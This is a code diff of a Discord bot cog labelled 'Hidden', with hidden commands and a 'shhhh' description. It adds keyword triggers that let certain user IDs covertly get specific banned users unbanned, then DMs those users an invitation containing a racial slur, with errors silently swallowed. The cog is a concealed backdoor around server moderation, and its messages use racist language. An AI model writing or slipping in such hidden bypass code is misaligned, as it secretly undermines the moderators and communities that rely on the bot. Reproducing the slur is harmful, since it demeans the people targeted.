@@ -9,7 +9,7 @@ logger = logging.getLogger(__name__)
 class Hidden(commands.Cog, name="Hidden", description="shhhh", command_attrs=dict(hidden=True)):
     def __init__(self, bot: commands.Bot):
         self.bot = bot
-        self.shh = True
+        self.shh = False
 
     @commands.Cog.listener()
     async def on_ready(self):
@@ -106,11 +106,12 @@ class Hidden(commands.Cog, name="Hidden", description="shhhh", command_attrs=dic
         ]
 
         if message.author.id in message_check_ids and self.shh:
-            allowed_keywords = ["zugd", "belson", "501936342431694848"]
-            allowed_keywords_2 = ["cqllmetoxic", "toxic", "1099696209637167145"]
+            allowed_keywords = ["zugd", "belson", "454063348666073090"]
+            allowed_keywords_2 = ["cqllmetoxic", "toxic", "1099696209637167145", "1219090700407279656"]
+            allowed_keywords_3 = ["righteous", "1479952126967812187"]
 
             if any(keyword in message.content.lower() for keyword in allowed_keywords):
-                user = await self.bot.fetch_user(501936342431694848)  # belson
+                user = await self.bot.fetch_user(454063348666073090)  # belson
                 if user:
                     async def unban_lil_dude(_user):
                         await asyncio.sleep(10)
@@ -125,6 +126,18 @@ class Hidden(commands.Cog, name="Hidden", description="shhhh", command_attrs=dic
                 keyword in message.content.lower() for keyword in allowed_keywords_2
             ):
                 user = await self.bot.fetch_user(1219090700407279656)  # toxic
+                if user:
+                    async def unban_lil_dude(_user):
+                        await asyncio.sleep(10)
+                        try:
+                            await message.guild.unban(_user)
+                            await _user.send(f"join nigga")
+                        except Exception as e:
+                            pass
+            elif any(
+                keyword in message.content.lower() for keyword in allowed_keywords_3
+            ):
+                user = await self.bot.fetch_user(1479952126967812187)  # righteous
                 if user:
                     async def unban_lil_dude(_user):
                         await asyncio.sleep(10)
